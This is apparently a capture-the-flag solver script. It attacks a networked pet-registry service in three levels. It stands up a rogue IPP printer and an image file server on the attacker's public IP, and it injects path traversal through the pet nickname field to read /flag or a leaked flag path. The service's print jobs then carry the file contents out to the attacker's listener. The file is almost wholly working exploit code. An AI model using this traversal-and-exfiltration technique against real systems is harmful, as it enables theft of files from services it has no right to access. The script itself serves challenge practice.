import os
import re
import sys
import socketserver
import threading
import random
import struct
from enum import Enum
from PIL import Image
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

import nclib


class MenuOptions(Enum):
    RegisterPet = 0
    ListPets = 1
    DelistPets = 2
    UpdatePetDescription = 3
    PrintPet = 4
    RegisterPrinter = 5
    ListPrinters = 6
    DeletePrinter = 7
    Exit = 8


def register_pet(s, name, species, breed, color, description):
    read_menu(s)
    s.sendline(f"{MenuOptions.RegisterPet.value}".encode())
    s.readuntil(b"Enter the pet's nickname: ")
    s.sendline(name.encode())
    s.readuntil(b"Enter the pet's species:")
    s.sendline(species.encode())
    s.readuntil(b"Enter the pet's breed: ")
    s.sendline(breed.encode())
    s.readuntil(b"Enter the pet's color: ")
    s.sendline(color.encode())
    s.readuntil(b"Enter the pet's description: ")
    s.sendline(description.encode())
    print(s.readline())

def register_printer(s, ip, port):
    read_menu(s)
    s.sendline(f"{MenuOptions.RegisterPrinter.value}".encode())
    s.readuntil(b"IP address and port")
    s.readuntil(b":")
    s.sendline(f"{ip}:{port}".encode())
    while True:
        r = s.readline()
        print(r)
        if b"successfully!" in r:
            break
    return True


def print_pet(s, pet_id: int, printer_id: int):
    read_menu(s)
    s.sendline(f"{MenuOptions.PrintPet.value}".encode())
    s.readuntil(b"pet ID to print: ")
    s.sendline(str(pet_id).encode())
    s.readuntil(b"the printer ID to use:")
    s.sendline(str(printer_id).encode())
    while True:
        r = s.readline()
        print(r)
        if not r:
            break
        if b"Print job sent successfully" in r or b"Failed to send print job" in r:
            break
    return True


def update_pet_description(s, pet_id: int, new_name: str, new_description: str, image_url: str) -> bool:
    read_menu(s)
    s.sendline(f"{MenuOptions.UpdatePetDescription.value}".encode())
    s.readuntil(b"the pet ID to update:")
    s.sendline(str(pet_id).encode())
    s.readuntil(b"enter the new name for")
    s.readline()
    s.sendline(new_name.encode())
    r = s.readline()
    print(r)
    if b"Invalid nickname" in r:
        return False
    assert b"enter the new description for" in r
    s.sendline(new_description.encode())

    s.readuntil(b"upload a new image")
    if not image_url:
        s.sendline(b"n")
    else:
        s.sendline(b"y")
        s.readuntil(b"Please enter the URL to the new image")
        s.readuntil(b": ")
        s.sendline(image_url.encode())
        while True:
            r = s.readline()
            print(r)
            if b"====" in r:
                break
    return True

def read_menu(s):
    s.readuntil(b"Enter your choice (")
    s.readuntil(b":")


def generate_image(x = 500, y = 300):
    # we generate a X x Y 8-bit bitmap
    img = Image.new("P", (x, y))
    for i in range(x):
        for j in range(y):
            img.putpixel((i, j), 0)
    img.save(os.path.join(BASE_DIR, "image.bmp"))


BASE_DIR = os.path.dirname(os.path.abspath(__file__))

PRINTER_RECV = b""


class Printer(socketserver.BaseRequestHandler):
    def _recv_line(self) -> bytes:
        data = b""
        while not b"\r\n" in data:
            ch = self.request.recv(1)
            if not ch:
                break
            data += ch
        return data

    def handle(self):
        print(f"{self.client_address[0]} connected!")
        # receive the HTTP header
        http_header = self._recv_line()
        assert b"POST /ipp/print HTTP/1.1" in http_header
        
        # find "Content-Length: "
        content_length = 0
        while True:
            line = self._recv_line().decode("utf-8")
            if "Content-Length: " in line:
                content_length = int(line.split(": ")[1].strip(" \r\n"))
            if line == "\r\n":
                break

        if not content_length:
            print("No content length found")
            return

        # receive the body
        body = self.request.recv(content_length)
        while len(body) < content_length:
            body += self.request.recv(content_length - len(body))

        print(body)
        global PRINTER_RECV
        PRINTER_RECV = body

        # get the request id
        resp_id = struct.unpack(">I", body[4:8])[0]
        
        if b"printer-state-reason" in body:
            # registering the printer
            print(f"Requesting printer attributes; request ID: {resp_id}")
            with open(os.path.join(BASE_DIR, "printer-attributes.bin"), "rb") as f:
                printer_attributes = f.read()
            
            # fix response ID
            printer_attributes = printer_attributes[:4] + struct.pack(">I", resp_id) + printer_attributes[8:]

            # send the printer attributes
            resp_header = [
                "HTTP/1.1 200 OK\r\n",
                "Server: ipp-server\r\n",
                "Content-Type: application/ipp\r\n",
                "Content-Length: " + str(len(printer_attributes)) + "\r\n",
                "\r\n"
            ]
            resp = "".join(resp_header).encode() + printer_attributes
            self.request.sendall(resp)
        else:
            print(f"Got a print job; Request ID: {resp_id}")

            # get the printer ID
            printer_id = struct.unpack(">I", body[4:8])[0]
            print(f"Printer ID: {printer_id}")

            # this is my stupid parsing algo
            pdf_start = body.find(b"%PDF")
            with open(os.path.join(BASE_DIR, "printer_data.bin"), "wb") as f:
                f.write(body[pdf_start:])


class FileServer(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Serving image to {self.client_address[0]}")
        self.send_response(200)
        self.send_header("Content-type", "image/bmp")
        self.end_headers()
        with open(os.path.join(BASE_DIR, "image.bmp"), "rb") as f:
            self.wfile.write(f.read())


def main():
    HOST = os.getenv("HOST", "localhost")
    PORT = int(os.getenv("PORT", 5001))
    PUBLIC_IP = os.getenv("PUBLIC_IP", "127.0.0.1")
    FILE_TO_STEAL = os.getenv("FILE_TO_STEAL", "/flag")
    sock = nclib.Netcat(HOST, PORT)

    if len(sys.argv) == 1:
        print("Usage: python3 solver.py <level>")
        return
    level = int(sys.argv[1])

    print(f"PUBLIC_IP: {PUBLIC_IP}")
    print(f"FILE_TO_STEAL: {FILE_TO_STEAL}")

    # start the Printer server on another thread
    printer_port = random.randint(10000, 65535)

    # start the printer server
    server = socketserver.TCPServer(("0.0.0.0", printer_port), Printer)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    # start the file server
    file_server = HTTPServer(("0.0.0.0", 18080), FileServer)
    file_server_thread = threading.Thread(target=file_server.serve_forever)
    file_server_thread.daemon = True
    file_server_thread.start()

    # main logic

    # handle ticket
    first_line = sock.recv(7)
    if first_line == b"Ticket ":
        ticket = os.environ["TICKET"]
        sock.sendline(ticket)
        line = sock.recvline()
        if b"Invalid" in line:
            print(line.decode())
            return

    # register
    sock.readuntil(b"name:")
    sock.sendline(b"test user")

    if level == 1:
        print("Pwning Level 1")
        # register_printer(sock, "192.168.0.171", 631)
        register_printer(sock, PUBLIC_IP, printer_port)
        register_pet(sock, "test pet", "Dog", "labrador", "black", "DESCRIPTION " + "a" * 1024)

        r = update_pet_description(sock, 0, "/../../../../../../../" + FILE_TO_STEAL, "whatever", "")
        assert r is False
        print_pet(sock, 0, 0)

    elif level == 2:
        print("Pwning Level 2")
        register_printer(sock, PUBLIC_IP, printer_port)
        register_pet(sock, "test pet", "Dog", "labrador", "black", "DESCRIPTION " + "a" * 1024)

        generate_image(x=500, y=600)
        r = update_pet_description(sock, 0, "good cat", "whatever", f"http://{PUBLIC_IP}:18080/petshop")
        assert r is True
        print_pet(sock, 0, 0)

    elif level == 3:
        print("Pwning Level 3")
        register_printer(sock, PUBLIC_IP, printer_port)
        register_pet(sock, "test pet", "Dog", "labrador", "black", "DESCRIPTION " + "a" * 1024)

        global PRINTER_RECV
        PRINTER_RECV = b""

        print_pet(sock, 0, 0)

        time.sleep(3)
        assert PRINTER_RECV
        r = PRINTER_RECV.decode("latin-1")
        m = re.search(r"/flag_[0-9A-Za-z]+", r)
        flag_path = m.group(0)
        print(f"Remote flag path: {flag_path}")

        # steal it
        r = update_pet_description(sock, 0, "/../../../../../../../" + flag_path, "whatever", "")
        assert r is False
        print_pet(sock, 0, 0)


if __name__ == "__main__":
    main()
